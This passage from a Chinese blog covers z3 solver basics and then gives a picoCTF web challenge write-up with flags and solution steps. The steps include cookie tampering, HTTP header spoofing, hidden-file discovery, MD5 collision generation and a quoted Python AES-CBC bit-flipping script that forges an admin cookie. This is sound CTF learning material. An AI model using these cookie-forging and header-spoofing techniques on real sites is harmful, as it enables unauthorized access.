class="line">x=Real(&#x27;x&#x27;)</span><br><span class="line">y=Int(&#x27;y&#x27;)</span><br><span class="line">a,b,c=Reals(&#x27;a b c&#x27;)</span><br><span class="line">s,r=Ints(&#x27;s r&#x27;)</span><br><span class="line">print(x+y+1+(a+s))</span><br><span class="line">print(ToReal(y)+c)</span><br></pre></td></tr></table></figure><p>如上展示了z3 Real和Int类型在做运算时进行的类型变换,很明显Real类型在和Int运算时Int类型会在z3运算内部自动调用ToReal来防止错误发生,当然我们也可以手动调用ToReal来达成相同的目的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">a,b,c=Ints(&#x27;a b c&#x27;)</span><br><span class="line">d,e=Reals(&#x27;d e&#x27;)</span><br><span class="line">solve(a&gt;b+2,a==2*c+10,c+b&lt;=1000,d&gt;=3)</span><br></pre></td></tr></table></figure><p>如上验证了不同运算的可行性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x,y=Reals(&#x27;x y&#x27;)</span><br><span class="line">t=simplify((x+y)**3,som=True)</span><br><span class="line">print(t)</span><br><span class="line">t=simplify(t,mul_to_power=True)</span><br><span class="line">print(t)</span><br></pre></td></tr></table></figure><p>这里演示了simplify的两个参数,som=True为拆解为单项式相加的形式,mul_to_power=True演示了把相同次幂的数进行合并成高次幂</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x,y=Reals(&#x27;x y&#x27;)</span><br><span class="line"># Two different way to set options</span><br><span class="line">print(simplify(x==y+2,artith_lhs=True))</span><br><span class="line">print(simplify(x==y+2,&quot;:artith-lhs&quot;,True))</span><br><span class="line"># show help page</span><br><span class="line">help_simplify()</span><br></pre></td></tr></table></figure><p>展示了设置simplify函数属性的两种方法和查看help帮助页面</p><h2 id="machine-arithmetic"><a class="markdownIt-Anchor" href="#machine-arithmetic"></a> Machine Arithmetic</h2><p><strong>这一部分包含的是对机器算术的介绍,现代CPU和主流的编程语言也使用的是位修复的向量来进行算术设计</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x, y = BitVecs(&#x27;x y&#x27;,16)</span><br><span class="line">print(x+2)</span><br><span class="line"># Internal representation</span><br><span class="line">print((x+y).sexpr())</span><br><span class="line">print(simplify(x+y-1))</span><br><span class="line"></span><br><span class="line">a=BitVecVal(-1,16)</span><br><span class="line">b=BitVecVal(65535,16)</span><br><span class="line">print(simplify(a==b))</span><br><span class="line"></span><br><span class="line">a=BitVecVal(-1,32)</span><br><span class="line">b=BitVecVal(65535,32)</span><br><span class="line">print(simplify(a==b))</span><br></pre></td></tr></table></figure><p>如上展示了显示位的内部表示形式,和如何声明未知数值和已知位向量;倒数第二段最终打印结果是True是因为-1和65535在16位二进制向量中代表的值是一样的,而32位中显然a要大的多了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">x,y=BitVecs(&#x27;x y&#x27;,32)</span><br><span class="line">solve(x+y==2,x&gt;0,y&gt;0)</span><br><span class="line">solve(x&amp;y==-y)</span><br><span class="line">solve(x&lt;0)</span><br><span class="line"># ULT=unsigned-version less than</span><br><span class="line">solve(ULT(x,0))</span><br><span class="line">solve(x&gt;&gt;2==3)</span><br><span class="line">solve(x&lt;&lt;2==3)</span><br><span class="line">solve(x&lt;&lt;2==24)</span><br></pre></td></tr></table></figure><p>如上展示了一些基本的位运算方法和基础函数的运用</p><h2 id="functions"><a class="markdownIt-Anchor" href="#functions"></a> Functions</h2><p>关于这一部分原文给出了大量的解释说明,说实话我也是有一部分没有仔细去弄明白;看了Stack-Overflow,这个z3 function本质上也是Python一种宏脚本定义;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">c=Int(&#x27;c&#x27;)</span><br><span class="line">t=Int(&#x27;t&#x27;)</span><br><span class="line"></span><br><span class="line">def f(x):</span><br><span class="line">    return x*t+c</span><br><span class="line">def find(data):</span><br><span class="line">    s=Solver()</span><br><span class="line">    s.add([f(x)==r for (x,r) in data])</span><br><span class="line">    t=s.check()</span><br><span class="line">    if s.check() == sat:</span><br><span class="line">        print(s.model())</span><br><span class="line">    else:</span><br><span class="line">        print(t)</span><br><span class="line"></span><br><span class="line">find([(1,55)])</span><br><span class="line">find([(12,34),(13,300)])</span><br></pre></td></tr></table></figure><p>如上的算法设计有两点:1. f(x),当我们给定一个已知量,则返回给我们包含未知变量的表达式,find(data)则是我们输入多条限制,函数根据限制找到符合要求的未知变量的计算值</p><p><strong>后面的也不写了,感觉后面板块目前有些用不上,如果真的需要用到的时候翻翻help page也是可以临时查查看的</strong></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python-z3 </tag>
            
            <tag> python-flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>picoctf web practice section one</title>
      <link href="/2023/01/22/picoctf-web-one/"/>
      <url>/2023/01/22/picoctf-web-one/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h1><p>这一个月一直看pwn，说实话二进制破解确实挺需要灵感的，没事的时候可以看看web，于是决定开一篇文章把picoctf的web安排一下，吃荤也需要配点菜；另外由于之前也对其他方面有一点入门了解，所以学起来应该会很容易</p><h2 id="get-ahead"><a class="markdownIt-Anchor" href="#get-ahead"></a> GET aHEAD</h2><p>这道题用于让我们了解有哪些方法请求方法，目前http的主要方法有：</p><ul><li>GET: 请求指定页面的信息，并返回实体</li><li>POST: 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）</li><li>HEAD: 向服务器索与GET请求相一致的响应，只不过响应体将不会被返回</li><li>PUT: 向指定资源位置上传其最新内容</li><li>DELETE: 请求服务器删除Request-URL所标识的资源</li><li>CONNECT: HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器</li><li>OPTIONS: 返回服务器针对特定资源所支持的HTTP请求方法，也可以利用向web服务器发送‘*’的请求来测试服务器的功能性</li><li>TRACE: 回显服务器收到的请求，主要用于测试或诊断</li></ul><p>请求方式改为<code>HEAD</code>，在<code>Responder Headers</code>中可以看到flag项<code>picoCTF&#123;r3j3ct_th3_du4l1ty_2e5ba39f&#125;</code></p><h2 id="cookies"><a class="markdownIt-Anchor" href="#cookies"></a> Cookies</h2><p>这道题主要就是cookie，网页默认返回界面是<code>cookie</code>值为-1时，我们根据input_hint输入<code>snickerdoodle</code>可以发现这个时候cookie值变为了0，既然页面会根据cookie值的变化发生奇妙的变化，那么我们可以尝试更改cookie的值来查看更多隐藏的数据</p><p>尝试cookie值，发现<code>name=28</code>后就没有有用的数值了，会自动重定向，但是我们可以在<code>name=18</code>找到flag<code>picoCTF&#123;3v3ry1_l0v3s_c00k135_88acab36&#125;</code></p><h2 id="insp3ct0r"><a class="markdownIt-Anchor" href="#insp3ct0r"></a> Insp3ct0r</h2><p>这一题旨在叫我们代码审查，原文如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">I used these to make this site:</span><br><span class="line">HTML</span><br><span class="line">CSS</span><br><span class="line">JS (JavaScript) </span><br></pre></td></tr></table></figure><p>我个人习惯先看js，我发现了js中的hint,<code>/* Javascript sure is neat. Anyways part 3/3 of the flag: _lucky?2e7b23e3&#125; */</code>，所以flag是由三部分组成，那么看看tab之前留下的，剩下的flag部分很可能就在HTML和CSS里面，果然，我们组在一起就是<code>picoCTF&#123;tru3_d3t3ct1ve_0r_ju5t_lucky?2e7b23e3&#125;</code></p><h2 id="scavenger-hunt"><a class="markdownIt-Anchor" href="#scavenger-hunt"></a> Scavenger Hunt</h2><p>寻宝游戏，js里面找到<code>/* How can I keep Google from indexing my website? */</code>,一般针对索引爬虫的配置都在<code>robots.txt</code>文件里面，发现</p><p>在HTML和CSS老地方找到了flag<code>picoCTF&#123;t</code>和<code>h4ts_4_l0</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /index.html</span><br><span class="line"># Part 3: t_0f_pl4c</span><br><span class="line"># I think this is an apache server... can you Access the next flag?</span><br></pre></td></tr></table></figure><p>来到<a href="https://httpd.apache.org/docs/2.4/configuring.html#htaccess">apache docs</a>，了解到了很多关于配置的信息，其中<code>.htaccess</code>是我们值得关注的内容，访问得到如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Part 4: 3s_2_lO0k</span><br><span class="line"># I love making websites on my Mac, I can Store a lot of information there.</span><br></pre></td></tr></table></figure><p><code>.DS_store</code>是MAC OS X系统创建的隐藏文件，主要作用是用于显示当前文件夹在桌面显示的一些配置属性，例如文件夹图标，上次打开窗体时的位置和窗体大小等，类似于Windows的<code>desktop.ini</code></p><p>访问<code>url + .DS_store</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Congrats! You completed the scavenger hunt. Part 5: _a69684fd&#125;</span><br></pre></td></tr></table></figure><p>组合起来就是<code>picoCTF&#123;th4ts_4_l0t_0f_pl4c3s_2_lO0k_a69684fd&#125;</code></p><h2 id="some-assembly-required-1"><a class="markdownIt-Anchor" href="#some-assembly-required-1"></a> Some Assembly Required 1</h2><p>点进去发现是一个input框和一个按钮，我随便输入一点东西，network并没发送请求，看来应该是脚本方式运作，发现了一个<code>G82XCw5CX3.js</code>文件，很明显并不是给人阅读的程序样式，所以js文件很可能被加密了</p><p>然后我尝试进行解密，因为我发现这可能是16进制混淆，进行反混淆后我尝试进行阅读，先看array部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const marlou = [&quot;value&quot;, &quot;2wfTpTR&quot;, &quot;instantiate&quot;, &quot;275341bEPcme&quot;, &quot;innerHTML&quot;, &quot;1195047NznhZg&quot;, &quot;1qfevql&quot;, &quot;input&quot;, &quot;1699808QuoWhA&quot;, &quot;Correct!&quot;, &quot;check_flag&quot;, &quot;Incorrect!&quot;, &quot;./JIFxzHyW8W&quot;, &quot;23SMpAuA&quot;, &quot;802698XOMSrr&quot;, &quot;charCodeAt&quot;, &quot;474547vVoGDO&quot;, &quot;getElementById&quot;, &quot;instance&quot;, &quot;copy_char&quot;, &quot;43591XxcWUl&quot;, &quot;504454llVtzW&quot;, &quot;arrayBuffer&quot;, &quot;2NIQmVj&quot;, &quot;result&quot;];</span><br></pre></td></tr></table></figure><blockquote><p>这里其实是不解密也可以看到的内容，我找了半天揭秘出来了一个可以看的格式，这里就不放出来了，所以之前的解密完全就是闲的 P_P</p></blockquote><p>看到<code>./JIFxzHyW8W</code>字符串，这个特别像对当前路径的访问，我们访问这个目录果然还真得到了一个文件；经过简单的浏览后，虽然发现这个不是<code>Plain Text</code>，但是仍然可以解析字符串，看到flag<code>picoCTF&#123;a2843c6ba4157dc1bc052818a6242c3f&#125;</code></p><h2 id="more-cookies"><a class="markdownIt-Anchor" href="#more-cookies"></a> More Cookies</h2><p>这里hint里面提到了<code>homomorphic encryption</code>的概念，大概意思如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同态加密是一种加密形式，允许用户在不先解密的情况下对其加密数据执行计算。 这些计算结果以加密形式保留，解密后会产生与对未加密数据执行操作时产生的输出相同的输出</span><br></pre></td></tr></table></figure><p>面对这种加密类型我一般都很蒙蔽，因为我本身了解的加密算法就那么几种，后面查阅后我发现一个老哥是通过descript中的<code>Cookies can Be modified Client-side</code>来发现这个CBC类型加密，AES是自己猜的（因为很常见），不妨碍我觉得这道题很抽象 😦</p><p>由于涉及了加密（就是AES-CBC加密算法），目前不想在<code>decrypt</code>上花费太多时间，所以在GitHub上找到了脚本，跑完后得到flag<code>picoCTF&#123;cO0ki3s_yum_a9a19fa6&#125;</code></p><blockquote><p>感觉这题分区错了</p></blockquote><p>附上脚本,作者首页<a href="https://github.com/HHousen">HHousen</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Inspired by https://www.youtube.com/watch?v=Fs3EbH-Wdhc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">ADDRESS = <span class="string">&quot;http://mercury.picoctf.net:15614/&quot;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">s.get(ADDRESS)</span><br><span class="line">cookie = s.cookies[<span class="string">&quot;auth_name&quot;</span>]</span><br><span class="line"><span class="comment"># Decode the cookie from base64 twice to reverse the encoding scheme.</span></span><br><span class="line">decoded_cookie = base64.b64decode(cookie)</span><br><span class="line">raw_cookie = base64.b64decode(decoded_cookie)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="comment"># Loop over all the bytes in the cookie.</span></span><br><span class="line">    <span class="keyword">for</span> position_idx <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(raw_cookie))):</span><br><span class="line">        <span class="comment"># Loop over all the bits in the current byte at `position_idx`.</span></span><br><span class="line">        <span class="keyword">for</span> bit_idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>):</span><br><span class="line">            <span class="comment"># Construct the current guess.</span></span><br><span class="line">            <span class="comment"># - All bytes before the current `position_idx` are left alone.</span></span><br><span class="line">            <span class="comment"># - The byte in the `position_idx` has the bit at position `bit_idx` flipped.</span></span><br><span class="line">            <span class="comment">#   This is done by XORing the byte with another byte where all bits are zero</span></span><br><span class="line">            <span class="comment">#   except for the bit in position `bit_idx`. The code `1 &lt;&lt; bit_idx`</span></span><br><span class="line">            <span class="comment">#   creates a byte by shifting the bit `1` to the left `bit_idx` times. Thus,</span></span><br><span class="line">            <span class="comment">#   the XOR operation will flip the bit in position `bit_idx`.</span></span><br><span class="line">            <span class="comment"># - All bytes after the current `position_idx` are left alone.</span></span><br><span class="line">            bitflip_guess = (</span><br><span class="line">                raw_cookie[<span class="number">0</span>:position_idx]</span><br><span class="line">                + ((raw_cookie[position_idx] ^ (<span class="number">1</span> &lt;&lt; bit_idx)).to_bytes(<span class="number">1</span>, <span class="string">&quot;big&quot;</span>))</span><br><span class="line">                + raw_cookie[position_idx + <span class="number">1</span> :]</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Double base64 encode the bit-blipped cookie following the encoding scheme.</span></span><br><span class="line">            guess = base64.b64encode(base64.b64encode(bitflip_guess)).decode()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Send a request with the cookie to the application and scan for the</span></span><br><span class="line">            <span class="comment"># beginning of the flag.</span></span><br><span class="line">            r = requests.get(ADDRESS, cookies=&#123;<span class="string">&quot;auth_name&quot;</span>: guess&#125;)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;picoCTF&#123;&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Admin bit found in byte <span class="subst">&#123;position_idx&#125;</span> bit <span class="subst">&#123;bit_idx&#125;</span>.&quot;</span>)</span><br><span class="line">                <span class="comment"># The flag is between `&lt;code&gt;` and `&lt;/code&gt;`.</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Flag: &quot;</span> + r.text.split(<span class="string">&quot;&lt;code&gt;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&lt;/code&gt;&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">exploit()</span><br></pre></td></tr></table></figure><h2 id="where-are-the-robots"><a class="markdownIt-Anchor" href="#where-are-the-robots"></a> where are the robots</h2><p>查看<code>robots.txt</code>发现<code>picoCTF&#123;ca1cu1at1ng_Mach1n3s_1bb4c&#125;</code></p><h2 id="logon"><a class="markdownIt-Anchor" href="#logon"></a> logon</h2><p>这道题也是一道关于cookie的题，具体的cookie结构如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__cf_bm</span><br><span class="line">_ga</span><br><span class="line">_gat</span><br><span class="line">_gat_gtag_UA_93258343_2</span><br><span class="line">_gid</span><br><span class="line">admin:&quot;False&quot;</span><br><span class="line">password</span><br><span class="line">username:&quot;admin&quot;</span><br></pre></td></tr></table></figure><p>这个<code>admin</code>条目其实就是用来看看是否为题目所描述的“特权”账户，更改为<code>True</code>就可以看到flag<code>picoCTF&#123;th3_c0nsp1r4cy_l1v3s_0c98aacc&#125;</code></p><h2 id="dont-use-client-side"><a class="markdownIt-Anchor" href="#dont-use-client-side"></a> dont-use-client-side</h2><p>这道题也是很简单，我们在js文件中看到<code>verify</code>函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">verify</span>(<span class="params"></span>) &#123;</span><br><span class="line">    checkpass = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;pass&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    split = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (checkpass.<span class="title function_">substring</span>(<span class="number">0</span>, split) == <span class="string">&#x27;pico&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (checkpass.<span class="title function_">substring</span>(split*<span class="number">6</span>, split*<span class="number">7</span>) == <span class="string">&#x27;706c&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (checkpass.<span class="title function_">substring</span>(split, split*<span class="number">2</span>) == <span class="string">&#x27;CTF&#123;&#x27;</span>) &#123;</span><br><span class="line">         <span class="keyword">if</span> (checkpass.<span class="title function_">substring</span>(split*<span class="number">4</span>, split*<span class="number">5</span>) == <span class="string">&#x27;ts_p&#x27;</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (checkpass.<span class="title function_">substring</span>(split*<span class="number">3</span>, split*<span class="number">4</span>) == <span class="string">&#x27;lien&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (checkpass.<span class="title function_">substring</span>(split*<span class="number">5</span>, split*<span class="number">6</span>) == <span class="string">&#x27;lz_b&#x27;</span>) &#123;</span><br><span class="line">              <span class="keyword">if</span> (checkpass.<span class="title function_">substring</span>(split*<span class="number">2</span>, split*<span class="number">3</span>) == <span class="string">&#x27;no_c&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (checkpass.<span class="title function_">substring</span>(split*<span class="number">7</span>, split*<span class="number">8</span>) == <span class="string">&#x27;5&#125;&#x27;</span>) &#123;</span><br><span class="line">                  <span class="title function_">alert</span>(<span class="string">&quot;Password Verified&quot;</span>)</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">      </span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_">alert</span>(<span class="string">&quot;Incorrect password&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>揭秘出来就是<code>picoCTF&#123;no_clients_plz_b706c5&#125;</code></p><h2 id="it-is-my-birthday"><a class="markdownIt-Anchor" href="#it-is-my-birthday"></a> It is my Birthday</h2><p>这是一道关于hash碰撞的题目</p><ul><li>问题冲突：两个不同的值，更过hash计算后发现值相同，导致在验证或者是存储等其他过程中导致内容冲突</li><li>解决方案：针对存储类问题可以用开放寻址法和拉链法；开放寻址法的概念是如果B要存放的位置已经被A占用那么我们可以直接向下寻址，直到找到空位置位置，另外拉链法就是利用数据结构中的链表来解决问题</li></ul><p>网站需要我们做的是两个不同的文件计算hash值后相同，让我们上传的文件后缀必须是pdf，那么我们就利用hash碰撞生成的两个文件，二进制不属于pdf格式无所谓，php只是粗略检测文件后缀名，所以我们用<a href="/cyber/tools/fastcoll_v1.0.0.5.exe">fastcoll</a>来生成需要的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./fastcoll_v1.0.0.5.exe -p inputfile -o outfile_one outfile_two</span><br></pre></td></tr></table></figure><h2 id="who-are-you"><a class="markdownIt-Anchor" href="#who-are-you"></a> Who are you?</h2><p>这道题需要我们明白<code>request header</code>的用处</p><ol><li>提示Only people who use the official PicoBrowser are allowed on this site!<ul><li>设置User-Agent值为PicoBrowser</li></ul></li><li>提示I dont trust users visiting from another site.<ul><li>设置Referer值为<a href="http://mercury.picoctf.net:39114/">http://mercury.picoctf.net:39114/</a></li></ul></li><li>提示I dont trust users who can be tracked.<ul><li>设置DNT为1</li></ul><blockquote><p>DNT equals dont track!</p></blockquote></li><li>提示This website is only for people from Sweden.<ul><li>设置X-Forward-For值为2.56.28.1(Sweden IP)</li></ul></li><li>提示Youre in Sweden but you dont speak Swedish?<ul><li>添加Accept-Language值sv</li></ul></li></ol><p>最后我们得到flag<code>picoCTF&#123;http_h34d3rs_v3ry_c0Ol_much_w0w_20ace0e4&#125;</code></p><h2 id="login"><a class="markdownIt-Anchor" href="#login"></a> login</h2><p>描述: My dog-sitter’s brother made this website but I can’t get in; can you help? <a href="http://login.mars.picoctf.net/">http://login.mars.picoctf.net/</a></p><p>东西都藏在js文件里面</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>((<span class="function"><span class="params">e</span> =&gt;</span> <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;load&quot;</span>, e))), <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;form&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;submit&quot;</span>, (<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">        e.<span class="title function_">preventDefault</span>();</span><br><span class="line">        <span class="keyword">const</span> r = &#123;</span><br><span class="line">                <span class="attr">u</span>: <span class="string">&quot;input[name=username]&quot;</span>,</span><br><span class="line">                <span class="attr">p</span>: <span class="string">&quot;input[name=password]&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            t = &#123;&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> e <span class="keyword">in</span> r) t[e] = <span class="title function_">btoa</span>(<span class="variable language_">document</span>.<span class="title function_">querySelector</span>(r[e]).<span class="property">value</span>).<span class="title function_">replace</span>(<span class="regexp">/=/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;YWRtaW4&quot;</span> !== t.<span class="property">u</span> ? <span class="title function_">alert</span>(<span class="string">&quot;Incorrect Username&quot;</span>) : <span class="string">&quot;cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ&quot;</span> !== t.<span class="property">p</span> ? <span class="title function_">alert</span>(<span class="string">&quot;Incorrect Password&quot;</span>) : <span class="keyword">void</span> <span class="title function_">alert</span>(<span class="string">`Correct Password! Your flag is <span class="subst">$&#123;atob(t.p)&#125;</span>.`</span>)</span><br><span class="line">    &#125;))</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><ul><li>YWRtaW4解码出来是admin</li><li>cGljb0NURns1M3J2M3JfNTNydjNyXzUzcnYzcl81M3J2M3JfNTNydjNyfQ解码出来是<code>picoCTF&#123;53rv3r_53rv3r_53rv3r_53rv3r_53rv3r&#125;</code></li></ul><h2 id="includes"><a class="markdownIt-Anchor" href="#includes"></a> Includes</h2><p>css和js分别发现<br /><code>picoCTF&#123;1nclu51v17y_1of2_</code>和<code>f7w_2of2_df589022&#125;</code><br />得到flag<code>picoCTF&#123;1nclu51v17y_1of2_f7w_2of2_df589022&#125;</code></p><h2 id="inspect-html"><a class="markdownIt-Anchor" href="#inspect-html"></a> Inspect HTML</h2><p>HTML注释中<code>picoCTF&#123;1n5p3t0r_0f_h7ml_1fd8425b&#125;</code></p><h2 id="local-authority"><a class="markdownIt-Anchor" href="#local-authority"></a> Local Authority</h2><p>可以看到form请求的地址是login.php，我们访问这个地址，然后可以发现里面有一个脚本叫做<code>secure.js</code>包含了checkPasswd的函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkPassword</span>(<span class="params">username, password</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>( username === <span class="string">&#x27;admin&#x27;</span> &amp;&amp; password === <span class="string">&#x27;strongPassword098765&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们就得到flag<code>picoCTF&#123;j5_15_7r4n5p4r3n7_05df90c8&#125;</code></p><h2 id="search-source"><a class="markdownIt-Anchor" href="#search-source"></a> Search source</h2><p>在<a 